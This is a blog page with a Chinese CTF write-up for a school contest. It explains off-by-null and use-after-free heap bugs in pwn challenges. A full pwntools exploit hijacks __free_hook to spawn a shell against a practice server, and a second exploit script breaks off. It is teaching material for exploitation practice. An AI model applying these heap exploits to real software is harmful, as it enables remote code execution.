<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="UJNCTF校赛wp"><meta name="keywords" content="wp,pwn,reverse,web,misc"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>UJNCTF校赛wp | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wp-by-lemon"><span class="toc-number">1.</span> <span class="toc-text">wp by lemon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.1.1.</span> <span class="toc-text">null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteMaster"><span class="toc-number">1.1.2.</span> <span class="toc-text">WriteMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E6%83%B3%E5%88%86%E4%BA%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">我想分享的一些分析技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%89%87"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">正片</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">完整exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0ub%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">伪造ub详解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#caculator"><span class="toc-number">1.1.3.</span> <span class="toc-text">caculator</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">详解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bbbbbbaaaaaasssssseeeeee"><span class="toc-number">1.2.1.</span> <span class="toc-text">bbbbbbaaaaaasssssseeeeee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zzzzzziiiiiipppppp"><span class="toc-number">1.2.2.</span> <span class="toc-text">zzzzzziiiiiipppppp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WaterMark"><span class="toc-number">1.2.3.</span> <span class="toc-text">WaterMark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#letter"><span class="toc-number">1.2.4.</span> <span class="toc-text">letter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#emoji-master"><span class="toc-number">1.2.5.</span> <span class="toc-text">emoji-master</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">出题人视角</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">解题人视角</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">1.3.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dragon"><span class="toc-number">1.3.1.</span> <span class="toc-text">dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#equation"><span class="toc-number">1.3.2.</span> <span class="toc-text">equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flattening"><span class="toc-number">1.3.3.</span> <span class="toc-text">flattening</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92-1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">出题人视角</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92-1"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">解题人视角</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wp-by-Sparta-EN"><span class="toc-number">2.</span> <span class="toc-text">wp by Sparta_EN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-PHP"><span class="toc-number">2.2.1.</span> <span class="toc-text">Simple PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expresssssss"><span class="toc-number">2.2.2.</span> <span class="toc-text">Expresssssss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Happy-PHP"><span class="toc-number">2.2.3.</span> <span class="toc-text">Happy PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Crypto"><span class="toc-number">2.3.1.</span> <span class="toc-text">EZ Crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-RSA"><span class="toc-number">2.3.2.</span> <span class="toc-text">Baby RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%A4%A7E%E4%BA%86"><span class="toc-number">2.3.3.</span> <span class="toc-text">我大E了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Traffic"><span class="toc-number">2.4.1.</span> <span class="toc-text">EZ Traffic</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">57</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">54</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">UJNCTF校赛wp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="wp-by-lemon"><a href="#wp-by-lemon" class="headerlink" title="wp by lemon"></a>wp by lemon</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>签到题，因为是出题人所以还是写下wp QAQ</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzom7s7kkj61h80lagp802.jpg" alt=""></p>
<p>edit函数中调用了sub_994，点进去观察函数</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzon020cfj616u0h8diw02.jpg" alt=""></p>
<p>这个函数本质上是想如果输入回车后填充00字节来代替回车的’\x0a’，但是忽略了填充完全的情况，导致off-by-null漏洞，可以溢出一个空字节</p>
<p>思路：申请一系列堆块，重点有俩堆块，一个堆块是被溢出的堆块记为victim，其size要满足0x?f0的条件，因为在header中填充后其size的低字节为01，offbynull溢出后其低字节为00，可以向前malloc_consolidate；一个堆块是victim的prev_size索引到的堆块，这个堆块要满足unsorted bin大小，因为在向前合并的过程中会unlink，会检查fd和bk的合法性，利用unsorted bin的特性让系统帮我们”伪造“fd和bk指针。</p>
<p>然后有了overlap岂不是随便玩就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./null&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.27/lib/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./null&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choide:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x560</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">1482</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;5&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(__free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(system)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h3 id="WriteMaster"><a href="#WriteMaster" class="headerlink" title="WriteMaster"></a>WriteMaster</h3><h4 id="我想分享的一些分析技巧"><a href="#我想分享的一些分析技巧" class="headerlink" title="我想分享的一些分析技巧"></a>我想分享的一些分析技巧</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy318nhvj61br0u0q9m02.jpg" alt=""></p>
<p>在add函数中第一眼看过去很乱，猜测申请了很多结构体什么的，这个时候有经验的师傅硬看很好分析，但是对于我们来说要学会偷鸡，运行一下程序看看到底是干啥的</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy5etqpsj610g0nmgn102.jpg" alt=""></p>
<p>看到先后输入了index（在红框框的上面，懒得重新截图了），header size，header，text size和text，然后找找add函数中的一堆exit信息中都输出了字符串，ida中看看</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy8nhz28j61e60ngq9z02.jpg" alt=""></p>
<p>结合题目名字大概能够猜出来是一个文章管理的东西，能够写标题，写文章正文，反正业务就是这么个业务，逻辑就是这么个逻辑，实在不行gdb一顿动调也能发现各个chunk之间的衔接关系。</p>
<p>所以先随便写个结构体看看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Article</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* header;</span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyn5t16rj60uh0u00yh02.jpg" alt=""></p>
<p>在ida中找到local types</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyook15qj61cs0p877b02.jpg" alt=""></p>
<p>导入结构体，然后更改bss中的变量202040的类型为article</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyq5cnj5j61om0n2gsj02.jpg" alt=""></p>
<p>看起来仍然不太对的样子，注意到有二级指针的存在，猜测文章头或者文章正文的地方还有一个结构体指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Text</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分别导入后，挨边试下，最终可以优化成如下样子</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzz0q208oj61je0lkgrb02.jpg" alt=""></p>
<p>总之会比嗯审好点</p>
<h4 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h4><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv18ihld8cj60si0hs76t02.jpg" alt=""></p>
<p>明显的UAF漏洞</p>
<p>只能申请小于0x60的chunk，输入666有个后门可以edit两次，如果不是限制了chunk的大小就是白给题</p>
<p>因为是uaf，拿到堆地址轻轻松松，通过uaf的布局伪造出ub，然后泄露出堆地址和libc的地址，最后劫持freehook来getshell，完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./WriterMaster&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./WriteMaster&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_show,_edit = <span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, header, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;header size:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sa(<span class="string">&quot;header:&quot;</span>, header)</span><br><span class="line">    sla(<span class="string">&quot;text size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span 